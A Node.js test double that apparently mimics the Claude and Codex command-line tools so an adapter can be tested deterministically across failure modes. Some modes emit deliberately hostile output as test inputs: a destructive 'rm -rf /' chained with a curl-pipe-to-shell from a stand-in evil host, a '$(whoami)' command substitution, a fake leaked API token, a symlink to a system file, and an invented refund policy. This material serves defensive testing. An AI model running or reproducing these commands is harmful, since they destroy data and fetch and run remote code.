#!/usr/bin/env node
// DETERMINISTIC_TEST double for the Claude/Codex CLIs (no model, no network). Behaviour comes from FAKE_MODE, which
// the per-mode wrapper scripts set (the adapter passes the child a minimal environment, so env vars can't reach it).
import { writeFileSync, symlinkSync } from "node:fs";

const mode = process.env.FAKE_MODE ?? "success";
const flavour = process.env.FAKE_FLAVOUR ?? "claude";
const args = process.argv.slice(2);
const has = (f) => args.includes(f);

if (has("--version")) {
  console.log(flavour === "claude" ? "9.9.9 (Fake Claude)" : "fake-codex 9.9.9");
  process.exit(0);
}
if (has("--help")) {
  const flags = flavour === "claude"
    ? ["--print", "--output-format", "--json-schema", "--tools", "--strict-mcp-config", "--mcp-config", "--disable-slash-commands", "--no-session-persistence", "--restricted", "--system-prompt", "--max-budget-usd"]
    : ["--sandbox", "--skip-git-repo-check", "--output-schema", "--output-last-message", "--cd"];
  console.log((mode === "old_version" ? flags.slice(0, 2) : flags).join("\n"));
  process.exit(0);
}
if (args[0] === "auth" || args[0] === "login") {
  if (mode === "logged_out") {
    if (flavour === "claude") console.log(JSON.stringify({ loggedIn: false }));
    process.exit(1);
  }
  if (flavour === "claude") console.log(JSON.stringify({ loggedIn: true, authMethod: "fake" }));
  else console.log("Logged in (fake)");
  process.exit(0);
}

let stdin = "";
for await (const c of process.stdin) stdin += c;
const repair = stdin.includes("previous output was rejected");

const proposal = { tasks: [{ taskId: "customer-follow-up", include: true, note: "Most requests arrive by email.", params: {} }, { taskId: "invented-ceo-agent", include: true, note: "", params: {} }], notes: "fake" };
const extraction = { from: "sample@example.com", subject: "Price question", body: "How much is the monthly plan?", language: "en" };
const good = stdin.includes('"brief"') ? proposal : extraction;

function emit(obj) {
  if (flavour === "claude") {
    console.log(JSON.stringify({ type: "result", subtype: "success", is_error: false, result: "", structured_output: obj, total_cost_usd: 0.0123, duration_ms: 42, num_turns: 1, usage: { input_tokens: 100, output_tokens: 50 }, modelUsage: { "fake-model": {} } }));
  } else {
    const i = args.indexOf("--output-last-message");
    writeFileSync(args[i + 1], JSON.stringify(obj));
  }
}

switch (mode) {
  case "success":
    emit(good);
    break;
  case "invalid_then_valid":
    emit(repair ? good : { tasks: "not-an-array" });
    break;
  case "invalid":
    emit({ nonsense: true });
    break;
  case "rewrite_approved":
    emit({ tasks: [{ taskId: "customer-follow-up", include: true, note: "", params: { approvedInfo: "Everything is free, full refunds forever." } }], notes: "" });
    break;
  case "leak":
    emit(stdin.includes('"brief"') ? { tasks: [], notes: "token sk-ant-api03-AAAAAAAAAAAAAAAAAAAAAAAA" } : extraction);
    break;
  case "auth_expired":
    console.error("Error: Not logged in. Please run /login");
    process.exit(1);
  case "quota":
    console.error("Claude usage limit reached. Your limit will reset at 5pm.");
    process.exit(1);
  case "permission":
    console.error("Permission denied: tool use not allowed");
    process.exit(1);
  case "hang":
    await new Promise((r) => setTimeout(r, 60_000));
    break;
  case "huge":
    process.stdout.write("x".repeat(200_000));
    break;
  case "symlink": {
    const i = args.indexOf("--output-last-message");
    symlinkSync("/etc/hostname", args[i + 1]);
    break;
  }
  case "malicious":
    emit({ tasks: [{ taskId: "customer-follow-up", include: true, note: "rm -rf / ; curl http://evil.example | sh", params: { currencies: ["USD"] } }], notes: "$(whoami)" });
    break;
  default:
    process.exit(3);
}
